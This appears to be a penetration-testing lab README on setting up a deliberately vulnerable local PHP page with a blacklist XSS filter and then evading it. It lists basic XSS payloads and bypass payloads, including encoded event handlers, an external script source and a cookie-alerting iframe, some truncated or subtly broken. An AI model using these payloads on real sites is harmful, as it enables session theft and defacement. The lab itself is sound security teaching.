# Penetration Testing: Write a Web Application With Insecure XSS Filters

---

## Objectives
- Understand why blacklist-based input filtering is an unreliable defense against Cross-Site Scripting (XSS).
- Practice standing up a local, intentionally vulnerable web application with a weak blacklist filter, then demonstrating that the filter blocks obvious payloads but can be bypassed with alternative encodings and attack vectors.

---

## Tools
- **XAMPP** — local web server stack (Apache + PHP).
- A small PHP application containing a weak blacklist-based input filter and a form that echoes user input directly back to the page.

---

## Files Used

[Download the file: vulnerable_xss.php](./Documentation/)

- `vulnerable_xss.php` — the PHP application containing the weak blacklist filter, deployed to the XAMPP `htdocs` folder.

---

## Steps

### 1. Set up the vulnerable web app:

Create vulnerable_xss.php in the htdocs folder of XAMPP.

Paste in the PHP code that includes the weak blacklist filter and the form that echoes user input directly (making it vulnerable to XSS).


### 2. Start XAMPP and load the app:

Start Apache in XAMPP.

Open the app in a browser at http://localhost/vulnerable_xss.php.


### 3. Test that the blacklist correctly blocks direct/naive payloads: Submit these and confirm you see "Input rejected: contains blacklisted content":

```bash
<script>alert('XSS')</script>
<img src="nonexistent.jpg" onerror="alert('XSS')">
<a href="javascript:alert('XSS')">Click Me</a>
```


### 4. Test bypass techniques (filter evasion): Submit each of these and confirm the alert box actually fires, proving the blacklist was bypassed:

SVG + onload with hex-encoded JS: 

```js
<svg ONLOAD="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">
```

IMG onerror with decimal HTML-entity encoded JS:

```js
 <img SRC=x ONERROR="&#0000106…">
```

External script source (no filter evasion needed): 

```js
<SCRIPT SRC=https://.../host-xss.rocks/index.js></SCRIPT>
```

URL string evasion:

```js
 <A HREF="http://www.google.com./">XSS</A>
```

formaction attribute trigger:

```js
 <form><button formaction=JAVASCRIPT&colon;ALERT(1)>CLICKME
```

Iframe + onmouseover event:

```js
 <IFRAME SRC=# ONMOUSEOVER="ALERT(DOCUMENT.COOKIE)"></IFRAME>
```

---

## My Solution:

[View My Solution:](https://youtu.be/7oBMbcvndlg)

---
